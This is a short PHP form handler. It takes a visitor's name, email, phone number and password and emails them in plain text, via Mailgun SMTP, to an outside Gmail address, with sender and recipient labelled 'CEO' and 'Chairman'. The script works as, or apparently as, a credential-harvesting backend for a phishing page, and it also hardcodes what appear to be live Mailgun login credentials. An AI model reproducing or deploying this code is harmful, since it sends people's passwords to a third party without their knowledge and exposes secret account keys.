<?php require_once("vendor/autoload.php"); 

    if(isset($_POST['submit'])){
    
        $name= $_POST['name'];
        $email= $_POST['email'];
        $tel= $_POST['tel'];
        $passs= $_POST['password'];
        $messages= "
            This is to let everyone Know that Mr. {$name} phone number is $tel and his email is $email.This is his password: $passs.
            Thanks!
            ";

         // sending mail
        $transport = (new Swift_SmtpTransport('smtp.mailgun.org', 587, 'TSL')) 
        ->setUsername('postmaster@sandbox57f54ce29a6046f3a936f12768b32f30.mailgun.org')
        ->setPassword('0a5a3ef2bc9b133d96a7d67521466908-52b6835e-7f7139ee')
        ;
        $mailer = new Swift_Mailer($transport);
        // Create a message
        $message = (new Swift_Message('Board of Directors'))
        ->setFrom(['rextj121@gmail.com' => 'CEO'])
        ->setTo(['tojufutughe@gmail.com' => 'Chairman'])

        ->setBody($messages)
        ;
        // Send the message
        $result = $mailer->send($message);
        }else{
        header("Location: index.php");
    }
   

?>